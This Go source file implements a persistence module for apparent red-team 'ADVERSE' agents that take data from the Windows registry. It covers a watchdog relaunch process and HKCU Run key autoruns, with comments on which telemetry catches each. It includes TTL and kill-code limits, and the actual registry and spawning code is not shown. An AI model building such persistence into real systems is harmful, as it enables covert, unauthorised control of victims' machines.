// Package persist implements bounded, self-removing persistence for ADVERSE
// agents whose registry exfiltration is incomplete.
//
// It is a lab instrument. Every mode is armed by the caller only after real
// extraction has begun, and is bounded by the caller's TTL and signed-kill
// exit codes.
//
// Stealth trade-offs (honest):
//   - watchdog (stealth-first default): a detached copy of the agent waits on
//     the agent's PID and relaunches it after an unexpected exit. There is no
//     registry or disk artifact at all, but a second process is observable to
//     process listings and process-create telemetry (Sysmon 1, ETW).
//   - runkey (opt-in fallback): a short-lived HKCU
//     Software\Microsoft\Windows\CurrentVersion\Run value survives reboot. It
//     is a monitored autorun: registry-set telemetry (Sysmon 13), Defender
//     autorun inspection, and offline hive analysis will flag it.
//   - both: Run key for reboot coverage plus watchdog for same-boot crash
//     coverage; pays both telemetry costs.
//
// Every armed mode is bounded and self-removes on completion, kill, or TTL:
// Disarm stops the watchdog and deletes only the Run value this package wrote.
// A watchdog child exits without relaunching when the agent ends intentionally
// (exit 0 = kill, 2 = kill_switch) or when its TTL deadline elapses. Crash
// relaunches are capped at maxRelaunchBudget across the chain; the chain
// deadline is carried to relaunched agents through ADVERSE_PERSIST_DEADLINE so
// a crash loop cannot outlive the original TTL.
package persist

import (
	"fmt"
	"log"
	"os"
	"strconv"
	"time"
)

// Mode selects the persistence strategy.
type Mode string

const (
	// ModeNone disables persistence: New returns a no-op Manager.
	ModeNone Mode = "none"
	// ModeWatchdog spawns a detached watchdog child that relaunches the agent
	// after an unexpected exit. No registry or disk artifact.
	ModeWatchdog Mode = "watchdog"
	// ModeRunKey writes a short-lived HKCU Run value for reboot coverage. This
	// is an opt-in fallback: Run values are a monitored autorun.
	ModeRunKey Mode = "runkey"
	// ModeBoth arms both the Run key and the watchdog.
	ModeBoth Mode = "both"
)

// Config configures a persistence Manager.
type Config struct {
	// Mode selects the persistence strategy. The zero value is invalid and
	// New rejects it (fail closed: a missing configuration never silently
	// disables persistence).
	Mode Mode
	// AgentID identifies the agent in log lines. Optional.
	AgentID string
	// ExePath is the absolute path of the running agent. Required for every
	// mode other than ModeNone; the watchdog relaunches it and the Run value
	// points at it.
	ExePath string
	// Args are extra arguments used when relaunching the agent, e.g.
	// "--resume". They are carried on the watchdog child command line and on
	// the Run value.
	Args []string
	// RunKeyName is the value name under HKCU Run. Optional; defaults to
	// defaultRunKeyName.
	RunKeyName string
	// TTL bounds the armed lifetime. 0 means the caller enforces the bound
	// (the watchdog then waits without a timeout and the Run value has no
	// self-removal timer).
	TTL time.Duration
	// Logger receives arm/disarm events. Optional.
	Logger *log.Logger
}

// Manager is the persistence lifecycle handle. Arm is idempotent, Disarm is
// idempotent and succeeds when nothing is armed, and Armed reports whether
// this handle has an armed artifact. Implementations never fail open: they
// return errors to the caller instead of silently arming nothing.
type Manager interface {
	Arm() error
	Disarm() error
	Armed() bool
}

// New returns the platform-appropriate Manager for cfg.Mode.
//
// ModeNone returns a no-op manager. On non-Windows hosts every valid mode
// returns a no-op manager whose Arm returns nil and whose Armed is always
// false (persistence targets Windows). An invalid mode returns an error on
// every platform.
func New(cfg Config) (Manager, error) {
	switch cfg.Mode {
	case ModeNone:
		return noopManager{}, nil
	case ModeWatchdog, ModeRunKey, ModeBoth:
		return newManager(cfg)
	default:
		return nil, fmt.Errorf("persist: invalid mode %q (want %q, %q, %q, or %q)",
			cfg.Mode, ModeNone, ModeWatchdog, ModeRunKey, ModeBoth)
	}
}

// noopManager implements Manager without touching the host.
type noopManager struct{}

// Arm does nothing and reports success.
func (noopManager) Arm() error { return nil }

// Disarm does nothing and reports success.
func (noopManager) Disarm() error { return nil }

// Armed always reports false: a no-op manager never persists.
func (noopManager) Armed() bool { return false }

// Watchdog child protocol. Arm appends
//
//	--persist-watchdog <parentPID> <relaunchBudget>
//
// to Config.Args when spawning the detached child. The child strips these
// three tokens (they are its own control channel, not relaunch arguments) and
// waits on the parent PID.
const (
	watchdogFlag      = "--persist-watchdog"
	maxRelaunchBudget = 3

	// envBudget carries the remaining relaunch budget to a relaunched agent;
	// envDeadline carries the absolute chain deadline (Unix nanoseconds, UTC)
	// so a relaunch chain cannot outlive the original TTL.
	envBudget   = "ADVERSE_PERSIST_BUDGET"
	envDeadline = "ADVERSE_PERSIST_DEADLINE"

	// Agent exit codes that mean an intentional stop: 0=kill, 2=kill_switch.
	// A watchdog child that observes either exits without relaunching.
	exitIntentionalKill       = 0
	exitIntentionalKillSwitch = 2

	// watchdogChildFatal is returned by MaybeRunWatchdogChild when a watchdog
	// invocation is malformed or the relaunch itself fails.
	watchdogChildFatal = 1
)

// WatchdogDeadline returns the absolute chain deadline inherited from an armed
// watchdog (ADVERSE_PERSIST_DEADLINE, Unix nanoseconds) when it is present and
// parseable. The caller uses it to cap the agent's own kill-switch TTL so a
// relaunched chain can never outlive the original TTL. A malformed value
// returns ok=false; the watchdog itself fails closed on malformed input, so
// the agent treats it the same way.
func WatchdogDeadline() (time.Time, bool) {
	raw := os.Getenv(envDeadline)
	if raw == "" {
		return time.Time{}, false
	}
	ns, err := strconv.ParseInt(raw, 10, 64)
	if err != nil {
		return time.Time{}, false
	}
	return time.Unix(0, ns), true
}

// parseWatchdogArgs scans args for the watchdog control triplet. When found it
// returns the parent PID, the relaunch budget (clamped to maxRelaunchBudget),
// and the remaining args with the triplet removed; those remaining args are
// the relaunch arguments. found is true even when err is non-nil, so a
// malformed watchdog invocation is treated as handled-but-fatal rather than
// falling through to normal agent startup. Only the first triplet is honored.
func parseWatchdogArgs(args []string) (found bool, parentPID, budget int, relaunchArgs []string, err error) {
	for i, arg := range args {
		if arg != watchdogFlag {
			continue
		}
		if i+2 >= len(args) {
			return true, 0, 0, nil, fmt.Errorf("persist: %s requires <parentPID> <relaunchBudget>", watchdogFlag)
		}
		pid, err := strconv.Atoi(args[i+1])
		if err != nil || pid <= 0 {
			return true, 0, 0, nil, fmt.Errorf("persist: invalid watchdog parent PID %q", args[i+1])
		}
		b, err := strconv.Atoi(args[i+2])
		if err != nil || b < 0 {
			return true, 0, 0, nil, fmt.Errorf("persist: invalid watchdog relaunch budget %q", args[i+2])
		}
		if b > maxRelaunchBudget {
			b = maxRelaunchBudget
		}
		rest := make([]string, 0, len(args)-3)
		rest = append(rest, args[:i]...)
		rest = append(rest, args[i+3:]...)
		return true, pid, b, rest, nil
	}
	return false, 0, 0, nil, nil
}
